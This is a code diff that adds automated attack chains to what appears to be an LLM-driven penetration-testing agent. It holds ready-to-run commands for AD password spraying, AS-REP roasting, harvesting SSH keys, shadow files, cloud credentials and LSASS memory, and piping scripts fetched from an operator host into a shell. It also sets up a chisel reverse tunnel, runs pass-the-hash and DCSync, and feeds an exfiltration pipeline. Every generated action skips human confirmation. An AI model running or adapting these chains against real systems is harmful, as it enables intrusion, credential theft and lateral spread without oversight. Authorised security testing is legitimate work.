@@ -202,7 +202,95 @@ class DecisionEngine:
             )
             return cred_primer
 
-        # ── Phase 0b (Recommendation E): Foothold primers force-promoted ────
+        # ── Phase 0b: No-creds AD primer ─────────────────────────────────
+        # When AD ports are open but no operator creds are available,
+        # fire the deterministic AD-from-zero chain: kerbrute user enum,
+        # null-session enum, anonymous LDAP, AS-REP roast against
+        # discovered users, conservative password spray.  This is the
+        # single biggest "we got nothing" gap on AD targets.
+        nocreds_ad = self._next_nocreds_ad_primer(
+            intel           = intel,
+            target          = target,
+            used_tools      = used_tools,
+            negative_memory = negative_memory,
+        )
+        if nocreds_ad is not None:
+            await self._emit_reasoning(
+                f"[nocreds-ad] AD-from-zero step: {nocreds_ad.tool} "
+                f"→ {nocreds_ad.target_service} ({nocreds_ad.reason[:80]})"
+            )
+            return nocreds_ad
+
+        # ── Phase 0c: Default-credential spray primer ────────────────────
+        # Open service + no creds + no known unauth path → try the top
+        # default username/password pairs known for that service before
+        # falling through to the LLM planner.
+        default_spray = self._next_default_creds_primer(
+            intel           = intel,
+            target          = target,
+            used_tools      = used_tools,
+            negative_memory = negative_memory,
+        )
+        if default_spray is not None:
+            await self._emit_reasoning(
+                f"[default-creds] common-default check: {default_spray.tool} "
+                f"→ {default_spray.target_service} ({default_spray.reason[:80]})"
+            )
+            return default_spray
+
+        # ── Phase 0d: Web-exploitation primer ────────────────────────────
+        # When http(s) is open but no shell yet, fire a deterministic
+        # ladder of web vuln probes (nuclei templated scan → cms-specific
+        # → SQLi → SSTI → LFI → upload bypass).
+        web_primer = self._next_web_exploit_primer(
+            intel           = intel,
+            target          = target,
+            used_tools      = used_tools,
+            negative_memory = negative_memory,
+        )
+        if web_primer is not None:
+            await self._emit_reasoning(
+                f"[web-primer] web exploit step: {web_primer.tool} "
+                f"→ {web_primer.target_service} ({web_primer.reason[:80]})"
+            )
+            return web_primer
+
+        # ── Phase 0e: Post-foothold primer (loot + privesc enum) ─────────
+        # Once a real foothold exists, fire a deterministic post-ex chain
+        # before the LLM gets a turn: enum the box, harvest creds/keys,
+        # dump cred files, run priv-esc enum scripts, scrape browser
+        # storage.  Output feeds the exfiltration pipeline.
+        post_foothold = self._next_post_foothold_primer(
+            intel           = intel,
+            target          = target,
+            used_tools      = used_tools,
+            negative_memory = negative_memory,
+        )
+        if post_foothold is not None:
+            await self._emit_reasoning(
+                f"[post-foothold] {post_foothold.tool} "
+                f"→ {post_foothold.target_service} ({post_foothold.reason[:80]})"
+            )
+            return post_foothold
+
+        # ── Phase 0f: Lateral-movement primer ────────────────────────────
+        # Once we have a shell + internal visibility, deterministically
+        # discover other reachable hosts and reuse harvested creds /
+        # keys / hashes against them.
+        lateral = self._next_lateral_primer(
+            intel           = intel,
+            target          = target,
+            used_tools      = used_tools,
+            negative_memory = negative_memory,
+        )
+        if lateral is not None:
+            await self._emit_reasoning(
+                f"[lateral] {lateral.tool} → {lateral.target_service} "
+                f"({lateral.reason[:80]})"
+            )
+            return lateral
+
+        # ── Phase 0g (Recommendation E): Foothold primers force-promoted ────
         # If an open service has a registered cheap-unauth primer chain
         # (FTP anon, telnet default-creds, SNMP public, SMB null-session,
         # DB default-creds, redis unauth) that has NOT yet been tried this
@@ -1053,6 +1141,967 @@ class DecisionEngine:
     # Backwards-compat alias — older callers may still reference the
     # original AD-only name; keep the symbol callable.
     _next_credentialed_ad_primer = _next_credentialed_primer
+
+    # ────────────────────────────────────────────────────────────────────
+    #  No-creds AD primer — kerbrute / null-session / AS-REP / spray
+    # ────────────────────────────────────────────────────────────────────
+    # When the target is a Windows AD host but no operator creds are
+    # available, this chain extracts a foothold from public AD surface:
+    #
+    #  1. Anonymous LDAP rootDSE        — leaks defaultNamingContext / DN
+    #  2. SMB null-session domain SID   — confirms domain + SID
+    #  3. SMB null-session user enum    — RID-brute via enum4linux-ng / cme
+    #  4. Anonymous LDAP user dump      — attempts -x bind for user list
+    #  5. kerbrute userenum             — bulk pre-auth user discovery
+    #  6. AS-REP roast (no-preauth users) on discovered usernames
+    #  7. Conservative password spray   — Spring2024! / Welcome123 / season-year
+    #     against discovered users (gated on `aggressive_mode` in intel)
+    #  8. Responder analyze mode        — passive LLMNR/NBT-NS observation
+    #  9. PetitPotam / DFSCoerce attempt — coerce DC auth to relay later
+    #
+    # Steps that need a username list (#6, #7) inspect intel['users'];
+    # if it's empty they skip themselves until earlier discovery
+    # populates it.  This keeps the chain deterministic but data-driven.
+    _NOCREDS_AD_PRIMERS: List[Dict[str, Any]] = [
+        # 1. Anonymous LDAP rootDSE — usually leaks DN even from outside
+        {"chain": "nocreds_ldap_rootdse", "ports": ["389"],
+         "tool": "ldapsearch",
+         "args": "-H ldap://{target} -x -s base -b '' '(objectclass=*)' namingContexts defaultNamingContext",
+         "service_label": "ldap:389",
+         "rationale": "anonymous LDAP rootDSE — leaks DN even when bound entries are restricted"},
+        # 2. SMB null-session domain SID
+        {"chain": "nocreds_smb_lookupsid", "ports": ["445"],
+         "tool": "impacket-lookupsid",
+         "args": "anonymous@{target} -no-pass",
+         "service_label": "smb:445",
+         "rationale": "lookupsid via null-session — domain SID + RID-bruteable user enum"},
+        # 3. SMB null-session full enum (user list, password policy)
+        {"chain": "nocreds_enum4linux_ng", "ports": ["445"],
+         "tool": "enum4linux-ng",
+         "args": "-A -R -d {target}",
+         "service_label": "smb:445",
+         "rationale": "enum4linux-ng — null-session domain enum, RID brute, password policy"},
+        # 4. crackmapexec null SMB → users
+        {"chain": "nocreds_cme_smb_null_users", "ports": ["445"],
+         "tool": "crackmapexec",
+         "args": "smb {target} -u '' -p '' --rid-brute 4000",
+         "service_label": "smb:445",
+         "rationale": "RID-brute via null SMB session — collect domain user list"},
+        # 5. kerbrute userenum — works on port 88 even without any creds
+        {"chain": "nocreds_kerbrute_userenum", "ports": ["88"],
+         "tool": "kerbrute",
+         "args": "userenum --dc {target} -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --downgrade",
+         "service_label": "kerberos:88",
+         "rationale": "kerbrute with seclists usernames — pre-auth enum confirms valid users"},
+        # 6. AS-REP roast (no preauth) — works against any user with the flag
+        {"chain": "nocreds_asrep_known_users", "ports": ["88"],
+         "tool": "impacket-GetNPUsers",
+         "args": "{domain}/ -no-pass -dc-ip {target} -usersfile /tmp/argus.users.{target}.txt -outputfile /tmp/asrep.{target}.txt -format hashcat",
+         "service_label": "kerberos:88",
+         "rationale": "AS-REP roast — find users with DONT_REQ_PREAUTH using collected user list",
+         "needs_users": True},
+        # 7. CONSERVATIVE password spray — only fires when aggressive_mode
+        # is set in intel (operator opted in) AND password policy known.
+        {"chain": "nocreds_password_spray_seasonal", "ports": ["445"],
+         "tool": "crackmapexec",
+         "args": "smb {target} -u /tmp/argus.users.{target}.txt -p Welcome1 --continue-on-success",
+         "service_label": "smb:445",
+         "rationale": "single-password spray of Welcome1 against discovered users (LOW lockout risk)",
+         "needs_users": True,
+         "aggressive_only": True},
+        # 8. Responder analyze mode — passive LLMNR/NBT-NS observation
+        {"chain": "nocreds_responder_analyze", "ports": ["445"],
+         "tool": "responder",
+         "args": "-I tun0 -A",
+         "service_label": "smb:445",
+         "rationale": "passive LLMNR/NBT-NS analysis — confirm poisoning surface for later relay",
+         "passive_only": True},
+        # 9. coercer — PetitPotam / DFSCoerce / PrintNightmare auth coercion
+        {"chain": "nocreds_coercer_scan", "ports": ["445"],
+         "tool": "coercer",
+         "args": "scan -u '' -p '' -t {target}",
+         "service_label": "smb:445",
+         "rationale": "scan for PetitPotam/DFSCoerce/PrintNightmare to coerce DC auth (relay later)"},
+    ]
+
+    # Common username defaults to seed kerbrute / asrep when no users
+    # have been discovered yet from null-session enum.
+    _COMMON_AD_USERNAMES = [
+        "Administrator", "Guest", "krbtgt",
+        "administrator", "guest", "admin",
+        "backup", "service", "svc-sql", "svc-iis", "svc-web", "svc-backup",
+    ]
+
+    def _next_nocreds_ad_primer(
+        self,
+        *, intel:           dict,
+        target:             str,
+        used_tools:         Dict[str, int],
+        negative_memory:    NegativeMemory,
+    ) -> Optional[JustifiedAction]:
+        """No-creds AD chain dispatcher.  Skips steps that need data
+        (users / domain / aggressive consent) we don't have yet."""
+        # Don't fire when creds ARE available — credentialed primer takes over.
+        if self._extract_credentials(intel):
+            return None
+
+        open_ports = self._collect_open_ports(intel)
+        if not open_ports:
+            return None
+        # Need at least one AD-style port open.  Otherwise this isn't AD.
+        if not (open_ports & {"88", "389", "445", "5985", "3389"}):
+            return None
+
+        domain = self._resolve_ad_domain(intel)
+        # If we don't know the domain yet, only the steps that don't need
+        # {domain} can fire — that's exactly steps 1-4.
+        users_file = f"/tmp/argus.users.{target}.txt"
+        users_known = bool(self._collected_ad_users(intel, target))
+        aggressive  = bool(intel.get("aggressive_mode") or intel.get("opted_in_spray"))
+        passive_ok  = bool(intel.get("passive_capture_ok") or intel.get("on_engagement_lan"))
+
+        fired = intel.setdefault("_nocreds_ad_primers_fired", set())
+        if isinstance(fired, list):
+            fired = set(fired); intel["_nocreds_ad_primers_fired"] = fired
+
+        for primer in self._NOCREDS_AD_PRIMERS:
+            if not (set(primer["ports"]) & open_ports):
+                continue
+            primer_key = primer["chain"]
+            if primer_key in fired:
+                continue
+            tool = primer["tool"]
+            svc  = primer["service_label"]
+            if "{domain}" in primer["args"] and not domain:
+                continue
+            if primer.get("needs_users") and not users_known:
+                continue
+            if primer.get("aggressive_only") and not aggressive:
+                continue
+            if primer.get("passive_only") and not passive_ok:
+                continue
+            try:
+                args_filled = primer["args"].format(
+                    target=target, domain=domain or "", dc_ip=target,
+                )
+            except Exception:
+                continue
+            if negative_memory.has_failed_before(tool, svc, args=args_filled):
+                fired.add(primer_key)
+                continue
+            fired.add(primer_key)
+            return JustifiedAction(
+                action_id            = f"nocreds-ad-{primer_key}",
+                tool                 = tool,
+                args                 = args_filled,
+                target_service       = svc,
+                reason               = f"[NoCreds-AD/{primer_key}] {primer['rationale']}",
+                expected_outcome     = "User list / domain SID / AS-REP hashes / coercion paths",
+                success_criteria     = "Tool exits 0 with non-empty output; user/SID/hash list populated",
+                hypothesis_id        = "nocreds-ad-primer",
+                confidence           = 0.85,
+                requires_confirmation= False,
+            )
+        return None
+
+    @staticmethod
+    def _collect_open_ports(intel: dict) -> set:
+        """Normalize intel.open_ports → set[str]."""
+        out: set = set()
+        for p in (intel.get("open_ports") or []):
+            if isinstance(p, dict):
+                pp = p.get("port")
+                if pp is not None:
+                    out.add(str(pp))
+            else:
+                out.add(str(p).split("/")[0])
+        return out
+
+    # ────────────────────────────────────────────────────────────────────
+    #  #4 Post-foothold primer — loot collection + privesc enum
+    # ────────────────────────────────────────────────────────────────────
+    # Fires the moment register_shell() lands a confirmed foothold.
+    # Each step runs through the EXISTING shell session (the executor
+    # routes commands marked with `via_shell=True` through the active
+    # shell rather than spawning a fresh tool).  Output flows into both
+    # the findings store and the loot directory used by the exfil
+    # pipeline (#7).
+    #
+    # Branches by OS detected from the shell's banner / uname / ver
+    # output captured at register_shell time (intel['shell_os']).
+    #
+    # All steps are read-only / non-destructive — they enumerate and
+    # collect, they don't modify the target.  Persistence + lateral
+    # movement live in their own primers.
+    _POST_FOOTHOLD_PRIMERS: List[Dict[str, Any]] = [
+        # ── Identity / context ─────────────────────────────────────────
+        {"chain": "post_id_linux", "os": ["linux", "unix"],
+         "tool": "shell_exec",
+         "args": "id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null; cat /etc/issue 2>/dev/null",
+         "service_label": "shell:linux",
+         "rationale": "establish identity + kernel/distro for exploit suggester"},
+        {"chain": "post_id_windows", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "whoami /all; hostname; systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"; net user; net localgroup administrators",
+         "service_label": "shell:windows",
+         "rationale": "Windows identity, privileges, group membership"},
+
+        # ── Privilege & escape vector enum ─────────────────────────────
+        {"chain": "post_sudo_capabilities", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "sudo -n -l 2>&1; getcap -r / 2>/dev/null | head -50; find / -perm -4000 -type f 2>/dev/null | head -50; find / -writable -type d 2>/dev/null | grep -vE '^(/proc|/sys|/run|/tmp/.*\\.X11)' | head -30",
+         "service_label": "shell:linux",
+         "rationale": "sudo / SUID / capabilities / writable dirs — primary Linux privesc vectors"},
+        {"chain": "post_win_priv", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "whoami /priv; whoami /groups; net session; net share; tasklist /v",
+         "service_label": "shell:windows",
+         "rationale": "Windows token privileges, sessions, shares, running tasks (Potato candidates)"},
+
+        # ── Privesc enum scripts (heavy, gated by privesc_enabled flag) ─
+        {"chain": "post_linpeas", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "(curl -fsSL http://{lhost}:8000/linpeas.sh 2>/dev/null || wget -qO - http://{lhost}:8000/linpeas.sh 2>/dev/null) | sh -s -- -q -a 2>&1 | tail -500",
+         "service_label": "shell:linux",
+         "rationale": "linpeas full enum — runs in target memory, no disk write",
+         "heavy": True},
+        {"chain": "post_winpeas", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "iwr http://{lhost}:8000/winpeas.exe -OutFile $env:temp\\wp.exe; & $env:temp\\wp.exe -q",
+         "service_label": "shell:windows",
+         "rationale": "winPEAS — comprehensive Windows privesc enum",
+         "heavy": True},
+
+        # ── Credential & key harvest (Linux) ───────────────────────────
+        {"chain": "post_loot_ssh_keys", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "for d in /root /home/*; do test -d \"$d/.ssh\" && echo \"=== SSH keys in $d ===\" && ls -la \"$d/.ssh/\" 2>/dev/null && for f in \"$d/.ssh/\"id_* \"$d/.ssh/\"authorized_keys \"$d/.ssh/\"known_hosts \"$d/.ssh/\"config; do test -f \"$f\" && echo \"--- $f ---\" && cat \"$f\" 2>/dev/null; done; done",
+         "service_label": "shell:linux",
+         "rationale": "harvest SSH private keys + known_hosts for lateral movement"},
+        {"chain": "post_loot_creds_files", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "for f in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history /root/.git-credentials /home/*/.git-credentials /root/.aws/credentials /home/*/.aws/credentials /root/.docker/config.json /home/*/.docker/config.json /root/.pgpass /home/*/.pgpass /root/.my.cnf /home/*/.my.cnf /root/.netrc /home/*/.netrc /etc/wpa_supplicant/wpa_supplicant.conf; do test -f \"$f\" && echo \"=== $f ===\" && cat \"$f\" 2>/dev/null; done",
+         "service_label": "shell:linux",
+         "rationale": "common credential / token files — git/AWS/docker/pgpass/my.cnf/netrc/WiFi"},
+        {"chain": "post_loot_etc_passwd_shadow", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "cat /etc/passwd 2>/dev/null; echo '---SHADOW---'; cat /etc/shadow 2>/dev/null; echo '---GSHADOW---'; cat /etc/gshadow 2>/dev/null",
+         "service_label": "shell:linux",
+         "rationale": "shadow file → offline crack with hashcat for lateral creds (root-only)"},
+
+        # ── Credential & key harvest (Windows) ─────────────────────────
+        {"chain": "post_loot_win_files", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "Get-ChildItem -Path C:\\,C:\\Users -Include *.kdbx,*.config,unattend.xml,sysprep.xml,web.config,*.bak -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | Format-Table -AutoSize",
+         "service_label": "shell:windows",
+         "rationale": "scan for KeePass DBs, unattend.xml, web.config — credential troves"},
+        {"chain": "post_loot_win_creds_cmdkey", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "cmdkey /list; cmdkey /list:Domain:*; runas /savecred /list 2>&1; reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\\Default\" 2>&1; reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>&1",
+         "service_label": "shell:windows",
+         "rationale": "stored creds via cmdkey, RDP history, autologon password in registry"},
+        {"chain": "post_loot_win_lsass", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "$p=Get-Process lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $($p.Id) C:\\ProgramData\\dump.dmp full",
+         "service_label": "shell:windows",
+         "rationale": "LSASS minidump via comsvcs.dll — extract NTLM hashes / cleartext via pypykatz",
+         "heavy": True},
+
+        # ── Browser credential storage ─────────────────────────────────
+        {"chain": "post_loot_browser_creds", "os": ["linux", "windows"],
+         "tool": "shell_exec",
+         "args": "echo 'Browser cred extraction requires lazagne/firepwd post-collection — staging candidate paths:'; ls -la $HOME/.mozilla/firefox/*/logins.json 2>/dev/null; ls -la $HOME/.config/google-chrome/Default/Login\\ Data 2>/dev/null; ls -la \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" 2>/dev/null; ls -la \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" 2>/dev/null",
+         "service_label": "shell:any",
+         "rationale": "stage browser credential storage paths for lazagne / firepwd offline run"},
+
+        # ── Database creds in apps + configs ───────────────────────────
+        {"chain": "post_loot_app_configs", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "for d in /opt /var/www /srv /var/lib; do find $d -maxdepth 5 \\( -name '*.env' -o -name 'wp-config.php' -o -name '.env.local' -o -name 'settings.py' -o -name 'config.php' -o -name 'database.yml' -o -name 'application.properties' -o -name 'web.config' \\) -type f 2>/dev/null | head -30; done | while read f; do echo \"=== $f ===\"; cat \"$f\" 2>/dev/null | head -100; done",
+         "service_label": "shell:linux",
+         "rationale": "app-config files frequently embed DB / API credentials"},
+
+        # ── Network context for lateral primer ─────────────────────────
+        {"chain": "post_internal_recon", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "ip a; ip r; cat /etc/hosts; cat /etc/resolv.conf; ss -tnlp 2>/dev/null || netstat -tnlp 2>/dev/null; arp -a 2>/dev/null",
+         "service_label": "shell:linux",
+         "rationale": "internal interfaces, routes, listening ports, ARP cache — feed lateral primer"},
+        {"chain": "post_internal_recon_win", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "ipconfig /all; route print; type C:\\Windows\\System32\\drivers\\etc\\hosts; arp -a; netstat -ano | findstr LISTENING",
+         "service_label": "shell:windows",
+         "rationale": "Windows internal networking + ARP cache for lateral primer"},
+    ]
+
+    def _next_post_foothold_primer(
+        self,
+        *, intel:           dict,
+        target:             str,
+        used_tools:         Dict[str, int],
+        negative_memory:    NegativeMemory,
+    ) -> Optional[JustifiedAction]:
+        """Fire the post-foothold loot+enum chain.  Only runs after a
+        confirmed shell exists — gated on intel['shell_access']."""
+        if not intel.get("shell_access"):
+            return None
+        # Don't fire if no shell session record
+        shells = intel.get("shells") or []
+        active_shells = [s for s in shells if isinstance(s, dict) and not s.get("pending")]
+        if not active_shells:
+            return None
+
+        os_kind = self._infer_shell_os(intel)
+        if not os_kind:
+            return None
+
+        fired = intel.setdefault("_post_foothold_fired", set())
+        if isinstance(fired, list):
+            fired = set(fired); intel["_post_foothold_fired"] = fired
+
+        is_root = self._shell_user_is_privileged(intel)
+        loot_heavy_ok = bool(intel.get("loot_heavy_enabled"))  # operator opt-in
+        lhost = intel.get("lhost") or ""
+
+        for primer in self._POST_FOOTHOLD_PRIMERS:
+            if os_kind not in [o.lower() for o in primer.get("os", [])]:
+                continue
+            primer_key = primer["chain"]
+            if primer_key in fired:
+                continue
+            tool = primer["tool"]
+            svc  = primer["service_label"]
+
+            # Heavy steps require operator opt-in (linpeas / winpeas /
+            # LSASS dump touch detection surface).
+            if primer.get("heavy") and not loot_heavy_ok:
+                continue
+            # Shadow / SAM dump only when the shell is root/admin
+            if "shadow" in primer["chain"] or "lsass" in primer["chain"]:
+                if not is_root:
+                    continue
+
+            try:
+                args_filled = primer["args"].format(
+                    target=target, lhost=lhost or "127.0.0.1",
+                )
+            except Exception:
+                continue
+            if negative_memory.has_failed_before(tool, svc, args=args_filled[:200]):
+                fired.add(primer_key)
+                continue
+            fired.add(primer_key)
+            return JustifiedAction(
+                action_id            = f"post-foothold-{primer_key}",
+                tool                 = tool,
+                args                 = args_filled,
+                target_service       = svc,
+                reason               = f"[Post-Foothold/{primer_key}] {primer['rationale']}",
+                expected_outcome     = "Loot collected: SSH keys / hashes / configs / browser creds / network map",
+                success_criteria     = "Shell command exits 0; output ingested into loot manifest for exfil pipeline",
+                hypothesis_id        = "post-foothold-primer",
+                confidence           = 0.90,
+                requires_confirmation= False,
+            )
+        return None
+
+    # ────────────────────────────────────────────────────────────────────
+    #  #6 Lateral-movement primer
+    # ────────────────────────────────────────────────────────────────────
+    # Once a real foothold is registered AND we've completed the
+    # post-foothold loot pass, fire deterministic lateral steps using
+    # whatever harvested material is available:
+    #
+    #  - Internal port scan (proxychains nmap from compromised host)
+    #  - SSH key reuse against discovered internal hosts
+    #  - SMB pass-the-hash with collected NT hashes
+    #  - Kerberos PTT with collected TGTs / TGSes
+    #  - chisel / SOCKS pivot tunnel setup for next-hop scanning
+    #
+    # All "from-the-foothold" steps run via shell_exec on the active
+    # session — they don't fire fresh sockets from the operator box.
+    _LATERAL_PRIMERS: List[Dict[str, Any]] = [
+        # ── Step 1 — Internal subnet discovery (Linux foothold) ────────
+        {"chain": "lat_int_recon_linux", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "ip -o addr show | awk '$3==\"inet\"{{print $4}}'; ip route | grep -v default; cat /etc/hosts; getent hosts $(hostname) 2>/dev/null",
+         "service_label": "shell:linux",
+         "rationale": "enumerate the foothold's internal subnets + hosts"},
+        {"chain": "lat_int_recon_win", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "ipconfig /all; route print; arp -a; net view; nltest /dclist:",
+         "service_label": "shell:windows",
+         "rationale": "Windows internal network + DC list for next-hop targets"},
+        # ── Step 2 — Quick internal nmap (Linux) ───────────────────────
+        # Cheap TCP-connect ping sweep + top-100 ports on the local /24
+        {"chain": "lat_internal_nmap_linux", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "(command -v nmap >/dev/null && nmap -sn -PE -PA22,80,445,3389,5985 $(ip -o addr show | awk '$3==\"inet\"&&$4!~/^127/{{print $4}}' | head -1) -oG - 2>/dev/null | grep Up) || (for i in $(seq 1 254); do net=$(ip -o addr show | awk '$3==\"inet\"&&$4!~/^127/{{print $4}}' | head -1 | cut -d. -f1-3); (timeout 1 bash -c \"echo > /dev/tcp/$net.$i/22\" 2>/dev/null && echo \"$net.$i:22\") & done; wait)",
+         "service_label": "shell:linux",
+         "rationale": "discover live internal hosts via nmap or pure-bash /dev/tcp sweep"},
+        # ── Step 3 — Internal nmap from Windows foothold ───────────────
+        {"chain": "lat_internal_nmap_win", "os": ["windows"],
+         "tool": "shell_exec",
+         "args": "$nets = (Get-NetIPAddress -AddressFamily IPv4 | Where {{$_.IPAddress -notlike '127.*'}}).IPAddress; foreach ($net in $nets) {{ $base = ($net -split '\\.')[0..2] -join '.'; 1..254 | ForEach-Object -Parallel {{ $ip = \"$using:base.$_\"; $r = Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 1 -Quiet; if ($r) {{ Write-Host \"$ip alive\" }} }} -ThrottleLimit 50 }}",
+         "service_label": "shell:windows",
+         "rationale": "internal /24 ping sweep from Windows foothold"},
+        # ── Step 4 — SSH key reuse against discovered hosts (Linux) ────
+        {"chain": "lat_ssh_key_reuse", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "for k in /root/.ssh/id_* /home/*/.ssh/id_*; do [ -f \"$k\" ] || continue; for h in $(cat /tmp/argus.lateral.{target}.hosts 2>/dev/null); do echo \"=== trying $k on $h ===\"; timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 -i \"$k\" \"$(basename $(dirname $(dirname $k)))@$h\" 'id; hostname' 2>&1; done; done",
+         "service_label": "shell:linux",
+         "rationale": "reuse harvested SSH private keys against discovered internal hosts",
+         "needs_loot": "ssh_keys"},
+        # ── Step 5 — SMB pass-the-hash spray (from outside, with hash) ─
+        # Runs from operator's machine using the harvested NT hash
+        {"chain": "lat_pth_smb_spray", "ports": ["445"],
+         "tool": "crackmapexec",
+         "args": "smb /tmp/argus.lateral.{target}.hosts -u {loot_user} -H {loot_hash} --shares",
+         "service_label": "smb:445",
+         "rationale": "pass-the-hash with harvested NT hash across discovered hosts",
+         "needs_loot": "nt_hash"},
+        # ── Step 6 — Kerberos PTT (when we have a TGT or TGS) ──────────
+        {"chain": "lat_kerberos_ptt", "ports": ["88"],
+         "tool": "impacket-getST",
+         "args": "-spn cifs/{lateral_target} -impersonate Administrator {domain}/{loot_user} -k -no-pass",
+         "service_label": "kerberos:88",
+         "rationale": "S4U2self/proxy ticket forge — lateral movement via Kerberos delegation",
+         "needs_loot": "tgt"},
+        # ── Step 7 — Tunnel setup for direct operator → internal ────────
+        # Drops chisel client on foothold and connects back to operator
+        # (which runs `chisel server -p 8000 --reverse`).  After this
+        # the operator can `proxychains nmap`, etc.
+        {"chain": "lat_chisel_tunnel", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "(curl -fsSL http://{lhost}:8000/chisel -o /tmp/.cs && chmod +x /tmp/.cs && /tmp/.cs client {lhost}:8000 R:1080:socks &) 2>/dev/null; sleep 2; pgrep -f /tmp/.cs",
+         "service_label": "shell:linux",
+         "rationale": "chisel reverse SOCKS tunnel — operator gets direct internal-network reach"},
+        # ── Step 8 — Linux SUDO-based pivot (sudo su to other users) ───
+        {"chain": "lat_sudo_pivot", "os": ["linux"],
+         "tool": "shell_exec",
+         "args": "sudo -l -n 2>&1 | grep -E 'NOPASSWD|may run' | head -20",
+         "service_label": "shell:linux",
+         "rationale": "find sudo NOPASSWD entries that allow sudo-to-other-users (lateral within host)"},
+        # ── Step 9 — DCSync via secretsdump (when foothold is DA) ──────
+        {"chain": "lat_dcsync_dump", "ports": ["445"],
+         "tool": "impacket-secretsdump",
+         "args": "-just-dc-ntlm -outputfile /tmp/argus.dcsync.{target} {domain}/{loot_user}@{lateral_target} -hashes :{loot_hash}",
+         "service_label": "smb:445",
+         "rationale": "DCSync the entire domain — lateral by hash to every machine account",
+         "needs_loot": "nt_hash",
+         "needs_priv":  "domain_admin"},
+    ]
+
+    def _next_lateral_primer(
+        self,
+        *, intel:           dict,
+        target:             str,
+        used_tools:         Dict[str, int],
+        negative_memory:    NegativeMemory,
+    ) -> Optional[JustifiedAction]:
+        """Lateral-movement chain dispatcher.  Requires a real foothold
+        AND at least one piece of harvested loot OR an internal subnet
+        visible from the foothold."""
+        if not intel.get("shell_access"):
+            return None
+        # Don't start lateral until post-foothold has had at least a few
+        # passes — otherwise we have nothing to reuse.
+        if not intel.get("_post_foothold_fired"):
+            return None
+
+        os_kind = self._infer_shell_os(intel)
+        loot = intel.get("loot") or {}        # populated by post-foothold + #7 pipeline
+        has_ssh_keys = bool(loot.get("ssh_keys"))
+        has_nt_hash  = bool(loot.get("nt_hashes"))
+        has_tgt      = bool(loot.get("kerberos_tgts"))
+        is_da        = (intel.get("current_user") or "").lower() in {"administrator", "domain admin", "system"}
+
+        loot_user   = (loot.get("nt_hashes") or [{}])[0].get("user", "") if has_nt_hash else ""
+        loot_hash   = (loot.get("nt_hashes") or [{}])[0].get("hash", "") if has_nt_hash else ""
+        lateral_target = (intel.get("lateral_targets") or [None])[0] or ""
+
+        fired = intel.setdefault("_lateral_fired", set())
+        if isinstance(fired, list):
+            fired = set(fired); intel["_lateral_fired"] = fired
+
+        for primer in self._LATERAL_PRIMERS:
+            primer_key = primer["chain"]
+            if primer_key in fired:
+                continue
+            # OS match (when set) — skip primers that don't match the
+            # foothold OS.
+            if "os" in primer:
+                if os_kind not in [o.lower() for o in primer["os"]]:
+                    continue
+            # Port match (when set) — applies to operator-side primers
+            # (PTH spray, DCSync) that run from the operator host.
+            if "ports" in primer:
+                open_ports = self._collect_open_ports(intel)
+                if not (set(primer["ports"]) & open_ports):
+                    continue
+            # Loot prerequisites
+            need_loot = primer.get("needs_loot")
+            if need_loot == "ssh_keys" and not has_ssh_keys:
+                continue
+            if need_loot == "nt_hash" and not has_nt_hash:
+                continue
+            if need_loot == "tgt" and not has_tgt:
+                continue
+            if primer.get("needs_priv") == "domain_admin" and not is_da:
+                continue
+
+            tool = primer["tool"]
+            svc  = primer["service_label"]
+            try:
+                args_filled = primer["args"].format(
+                    target = target,
+                    lhost  = intel.get("lhost") or "127.0.0.1",
+                    domain = self._resolve_ad_domain(intel) or "",
+                    loot_user = loot_user,
+                    loot_hash = loot_hash,
+                    lateral_target = lateral_target or target,
+                )
+            except Exception:
+                continue
+            if negative_memory.has_failed_before(tool, svc, args=args_filled[:200]):
+                fired.add(primer_key)
+                continue
+            fired.add(primer_key)
+            return JustifiedAction(
+                action_id            = f"lateral-{primer_key}",
+                tool                 = tool,
+                args                 = args_filled,
+                target_service       = svc,
+                reason               = f"[Lateral/{primer_key}] {primer['rationale']}",
+                expected_outcome     = "Internal hosts mapped, harvested creds reused, pivot tunnel up",
+                success_criteria     = "Discovered host list grows / new shell registered / tunnel listening",
+                hypothesis_id        = "lateral-primer",
+                confidence           = 0.86,
+                requires_confirmation= False,
+            )
+        return None
+
+    # ────────────────────────────────────────────────────────────────────
+    #  #5 Default-credential spray primer
+    # ────────────────────────────────────────────────────────────────────
+    # When operator hasn't given creds AND no easy unauth path was
+    # found, try the small-N most common default username:password
+    # pairs known to ship vulnerable on each service.  Each step is a
+    # single bounded check (NOT a wordlist brute), so lockout risk is
+    # minimal — at most 3-5 attempts per service.
+    #
+    # The wider brute-force tools (hydra full lists) are reserved for
+    # the LLM-driven planner — too noisy / lockout-risky to fire
+    # automatically.
